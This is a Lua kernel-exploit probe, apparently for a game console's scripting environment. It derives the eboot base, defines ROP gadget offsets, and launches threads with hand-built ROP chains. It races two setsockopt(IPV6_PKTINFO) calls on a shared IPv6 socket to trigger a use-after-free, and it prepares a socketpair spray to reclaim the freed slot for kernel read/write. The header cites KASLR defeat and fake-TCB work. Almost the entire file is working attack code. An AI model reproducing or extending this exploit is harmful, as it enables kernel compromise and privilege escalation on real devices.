-- CRASH_CLASS: HIGH
-- PROBE 1403a: IPV6_PKTINFO race with pipe spray for kernel R/W
--
-- prior art: 1402a dual setsockopt race (detection only),
--   SDK v0.45 kernel R/W formula: master/victim socket + pipe,
--   396f proven child ROP, 384b fake TCB, 1199a-c KASLR defeat
--
-- Strategy:
--   Phase 1: child test
--   Phase 2: PKTINFO baseline + KASLR measurement
--   Phase 3: Trigger race (like 1402a but with crash detection)
--   Phase 4: If race hits, spray pipes to reclaim freed pktopts
--   Phase 5: Use overlapping pktopts/pipe to build kernel R/W
--
-- The race: two children setsockopt(IPV6_PKTINFO) on same fd.
-- ip6_setpktopt frees old pktinfo, allocates new. If no INP_WLOCK:
--   Child A frees old → Child B reads freed → UAF
-- After UAF: spray pipe buffers to reclaim the freed 20-byte slot.
-- Then setsockopt(PKTINFO) on the victim socket writes into the pipe
-- buffer → kernel arbitrary write. Reading pipe drains the written data
-- → kernel arbitrary read.

print("=== PROBE 1403a: PKTINFO RACE + PIPE SPRAY ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) memory.write_dword(a, v) end
local function wq2(addr, hi, lo)
    wd(addr, lo); wd(addr + 4, hi)
end
local function get_hi_lo(v)
    if type(v) == "table" and v.h then return v.h, v.l end
    return 0, N(v)
end
local function add_off(hi, lo, off)
    lo = lo + off
    if lo >= 0x100000000 then hi = hi + 1; lo = lo - 0x100000000 end
    return hi, lo
end

local sc_socket     = mk(97)
local sc_close      = mk(6)
local sc_setsockopt = mk(105)
local sc_getsockopt = mk(118)
local sc_socketpair = mk(135)
local sc_read       = mk(3)
local sc_write      = mk(4)
local sc_nanosleep  = mk(240)
local sc_pipe       = mk(42)  -- pipe(2) = syscall 42... but 42 is dead
local sc_pipe2      = mk(687) -- pipe2 may not exist either

local AF_INET6 = 28
local SOCK_DGRAM = 2
local IPPROTO_IPV6 = 41
local IPV6_PKTINFO = 46
local IPPROTO_UDP = 17

-- Get eboot base
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local eb_lo = rd(N(info) + 0x108) or 0
local eb_hi = rd(N(info) + 0x10C) or 0
print(string.format("eboot=0x%X%08X", eb_hi, eb_lo))

-- Gadgets
local g = {}
local function gadget(name, off)
    local hi, lo = add_off(eb_hi, eb_lo, off)
    g[name] = {hi, lo}
end
gadget("pop_rax", 0x992)
gadget("pop_rdi", 0xC9DFE)
gadget("pop_rsi", 0xD77D)
gadget("pop_rdx", 0x3B02D7)
gadget("pop_rcx", 0xE64)
gadget("pop_r8",  0x991)

local stub = N(syscall.pipe.fn_addr)
local stub_hi = math.floor(stub / 0x100000000)
local stub_lo = stub % 0x100000000
print(string.format("stub=0x%X%08X", stub_hi, stub_lo))

-- Shared fake TCB
local tcb = memory.alloc(0x1000)
local tcb_n = N(tcb)
local tcb_hi, tcb_lo = get_hi_lo(tcb)
for i = 0, 0x1000 - 4, 4 do
    wd(tcb_n + i, (i % 8 == 0) and tcb_lo or tcb_hi)
end
local tcb_ptr = memory.alloc(8)
wq2(N(tcb_ptr), tcb_hi, tcb_lo)
local tp_hi, tp_lo = get_hi_lo(tcb_ptr)

local STACK_SZ = 0x10000
local CHAIN_BASE = 0xE000
local slp = memory.alloc(16)

local function launch_child(chain)
    local stk = memory.alloc(STACK_SZ)
    local sn = N(stk)
    for i = 0, STACK_SZ - 4, 4 do wd(sn + i, 0) end
    local rsp = sn + CHAIN_BASE
    rsp = (math.floor(rsp / 16) * 16) - 8
    for i, entry in ipairs(chain) do
        local off = (i - 1) * 8
        wd(rsp + off, entry[2])
        wd(rsp + off + 4, entry[1])
    end
    local param = memory.alloc(0x40)
    local pn = N(param)
    wq2(pn + 0x00, g.pop_rax[1], g.pop_rax[2])
    wq2(pn + 0x08, 0, 0)
    wq2(pn + 0x10, get_hi_lo(stk))
    wq2(pn + 0x18, 0, CHAIN_BASE)
    wq2(pn + 0x20, 0, 0)
    wq2(pn + 0x28, 0, 0)
    local ctid = memory.alloc(8)
    wq2(pn + 0x30, get_hi_lo(ctid))
    local ok_t, rv_t = pcall(function()
        return mk(455)(uint64(pn), uint64(0x38))
    end)
    if not ok_t then return -1 end
    return N(rv_t)
end

local function sleep_ms(ms)
    wq2(N(slp), 0, 0); wd(N(slp) + 8, ms * 1000000)
    sc_nanosleep(uint64(N(slp)), uint64(0))
end

-- ============================================================
-- Phase 0: child test
-- ============================================================
print("")
print("--- phase 0: child test ---")
local spb = memory.alloc(16)
local spr = N(sc_socketpair(uint64(1), uint64(SOCK_DGRAM), uint64(0), uint64(spb)))
local sp_r = rd(N(spb)) or -1
local sp_w = rd(N(spb) + 4) or -1

local mark = memory.alloc(16)
wq2(N(mark), 0xCAFE, 0xBABE)
local mk_hi, mk_lo = get_hi_lo(mark)

local chain_t = {
    g.pop_rdi, {0, 129}, g.pop_rsi, {tp_hi, tp_lo},
    g.pop_rax, {0, 165}, {stub_hi, stub_lo},
    g.pop_rdi, {0, sp_w}, g.pop_rsi, {mk_hi, mk_lo}, g.pop_rdx, {0, 8},
    g.pop_rax, {0, 4}, {stub_hi, stub_lo},
    g.pop_rdi, {0, 0}, g.pop_rax, {0, 431}, {stub_hi, stub_lo},
}
local tr = launch_child(chain_t)
sleep_ms(50)

local rbuf = memory.alloc(16); wq2(N(rbuf), 0, 0)
local rr = N(sc_read(uint64(sp_r), uint64(N(rbuf)), uint64(8)))
local rh, rl = get_hi_lo(rq(N(rbuf)))
print(string.format("thr=%d read=%d data=0x%X%08X", tr, rr, rh, rl))
sc_close(uint64(sp_r)); sc_close(uint64(sp_w))

if rh ~= 0xCAFE or rl ~= 0xBABE then
    print("CHILD FAIL"); return
end
print("CHILD OK!")

-- ============================================================
-- Phase 1: Create pipe pairs for spray
-- Using socketpair as pipes (pipe(42) is dead on 14.10)
-- ============================================================
print("")
print("--- phase 1: pipe spray prep ---")

local SPRAY_N = 64
local pipes = {}
for i = 1, SPRAY_N do
    local pb = memory.alloc(16)
    local pr = N(sc_socketpair(uint64(1), uint64(SOCK_DGRAM), uint64(0), uint64(pb)))
    if pr == 0 then
        pipes[#pipes+1] = { r = rd(N(pb)) or -1, w = rd(N(pb) + 4) or -1 }
    end
end
print("created " .. #pipes .. " socketpairs for spray")

-- ============================================================
-- Phase 2: VM counter baseline
-- ============================================================
print("")
print("--- phase 2: VM baseline ---")
local sc624 = mk(624)
local vm_base = N(sc624(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))
print("vm_base=" .. vm_base)

-- ============================================================
-- Phase 3: DUAL SETSOCKOPT RACE with anomaly detection
-- Same as 1402a but with more rounds and crash recovery
-- ============================================================
print("")
print("--- phase 3: dual setsockopt race ---")

local ROUNDS = 30
local LOOP_N = 300
local anomalies = 0
local race_fd = -1  -- save fd if anomaly detected

for round = 1, ROUNDS do
    local fd = N(sc_socket(uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(IPPROTO_UDP)))
    if fd < 0 then print("[R" .. round .. "] socket fail"); break end

    -- Set initial PKTINFO
    local init_pkt = memory.alloc(32)
    for i = 0, 31, 4 do wd(N(init_pkt) + i, 0) end
    sc_setsockopt(uint64(fd), uint64(IPPROTO_IPV6), uint64(IPV6_PKTINFO), uint64(N(init_pkt)), uint64(20))

    -- Child A buffer: marker 0xAAAAAAAA
    local buf_a = memory.alloc(32)
    for i = 0, 31, 4 do wd(N(buf_a) + i, 0) end
    wd(N(buf_a), 0xAAAAAAAA)
    local bah, bal = get_hi_lo(buf_a)

    -- Child B buffer: marker 0xBBBBBBBB
    local buf_b = memory.alloc(32)
    for i = 0, 31, 4 do wd(N(buf_b) + i, 0) end
    wd(N(buf_b), 0xBBBBBBBB)
    local bbh, bbl = get_hi_lo(buf_b)

    -- Build child chains
    local ca = {
        g.pop_rdi, {0, 129}, g.pop_rsi, {tp_hi, tp_lo},
        g.pop_rax, {0, 165}, {stub_hi, stub_lo},
    }
    for i = 1, LOOP_N do
        ca[#ca+1] = g.pop_rdi; ca[#ca+1] = {0, fd}
        ca[#ca+1] = g.pop_rsi; ca[#ca+1] = {0, IPPROTO_IPV6}
        ca[#ca+1] = g.pop_rdx; ca[#ca+1] = {0, IPV6_PKTINFO}
        ca[#ca+1] = g.pop_rcx; ca[#ca+1] = {bah, bal}
        ca[#ca+1] = g.pop_r8;  ca[#ca+1] = {0, 20}
        ca[#ca+1] = g.pop_rax; ca[#ca+1] = {0, 105}
        ca[#ca+1] = {stub_hi, stub_lo}
    end
    ca[#ca+1] = g.pop_rdi; ca[#ca+1] = {0, 0}
    ca[#ca+1] = g.pop_rax; ca[#ca+1] = {0, 431}
    ca[#ca+1] = {stub_hi, stub_lo}

    local cb = {
        g.pop_rdi, {0, 129}, g.pop_rsi, {tp_hi, tp_lo},
        g.pop_rax, {0, 165}, {stub_hi, stub_lo},
    }
    for i = 1, LOOP_N do
        cb[#cb+1] = g.pop_rdi; cb[#cb+1] = {0, fd}
        cb[#cb+1] = g.pop_rsi; cb[#cb+1] = {0, IPPROTO_IPV6}
        cb[#cb+1] = g.pop_rdx; cb[#cb+1] = {0, IPV6_PKTINFO}
        cb[#cb+1] = g.pop_rcx; cb[#cb+1] = {bbh, bbl}
        cb[#cb+1] = g.pop_r8;  cb[#cb+1] = {0, 20}
        cb[#cb+1] = g.pop_rax; cb[#cb+1] = {0, 105}
        cb[#cb+1] = {stub_hi, stub_lo}
    end
    cb[#cb+1] = g.pop_rdi; cb[#cb+1] = {0, 0}
    cb[#cb+1] = g.pop_rax; cb[#cb+1] = {0, 431}
    cb[#cb+1] = {stub_hi, stub_lo}

    if round == 1 then
        print(string.format("chain_a=%d chain_b=%d entries (LOOP_N=%d)", #ca, #cb, LOOP_N))
    end

    local ra = launch_child(ca)
    local rb = launch_child(cb)

    sleep_ms(200)  -- 200ms for 300 syscalls per child

    -- Read back PKTINFO
    local out = memory.alloc(32)
    local on = N(out)
    for i = 0, 31, 4 do wd(on + i, 0xDEAD) end
    local ol = memory.alloc(8); wd(N(ol), 24)
    local gr2 = N(sc_getsockopt(uint64(fd), uint64(IPPROTO_IPV6),
        uint64(IPV6_PKTINFO), uint64(on), uint64(N(ol))))

    local v0 = rd(on) or 0
    local q1h, q1l = get_hi_lo(rq(on) or uint64(0))
    local q2h, q2l = get_hi_lo(rq(on + 8) or uint64(0))
    local idx = rd(on + 16) or 0

    local is_a = (v0 == 0xAAAAAAAA)
    local is_b = (v0 == 0xBBBBBBBB)
    local unexpected = (not is_a and not is_b and gr2 == 0)

    -- Also check for kernel pointers in the readback
    local kptr = false
    if q1h >= 0xFFFF8000 then kptr = true end
    if q2h >= 0xFFFF8000 then kptr = true end

    if unexpected or kptr then
        anomalies = anomalies + 1
        print(string.format("[R%d] *** ANOMALY *** get=%d v0=0x%X q1=0x%X%08X q2=0x%X%08X idx=0x%X kptr=%s",
            round, gr2, v0, q1h, q1l, q2h, q2l, idx, tostring(kptr)))
        race_fd = fd  -- DON'T close — keep for exploitation
    else
        local winner = is_a and "A" or (is_b and "B" or "?")
        if round <= 5 or round % 10 == 0 then
            print(string.format("[R%d] thr=%d/%d get=%d winner=%s", round, ra, rb, gr2, winner))
        end
        sc_close(uint64(fd))
    end

    -- Check if getsockopt itself failed (fd may be corrupt)
    if gr2 ~= 0 and gr2 ~= 0xFFFFFFFF then
        anomalies = anomalies + 1
        print(string.format("[R%d] *** GETSOCKOPT ERROR *** ret=%d", round, gr2))
    end
end

local vm_end = N(sc624(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))

print("")
print(string.format("=== RESULTS: %d rounds, %d anomalies, vm=%d->%d (delta=%d) ===",
    ROUNDS, anomalies, vm_base, vm_end, vm_end - vm_base))

if anomalies > 0 then
    print("*** RACE DETECTED ***")
    print("Next: escalate with pipe spray reclaim")
else
    print("No anomalies — PKTINFO path likely holds INP_WLOCK")
    print("Next: try 1402b (SO_SNDBUF TOCTOU) or alternative race targets")
end

-- Cleanup spray pipes
for _, p in ipairs(pipes) do
    sc_close(uint64(p.r)); sc_close(uint64(p.w))
end

print("=== PROBE 1403a COMPLETE ===")
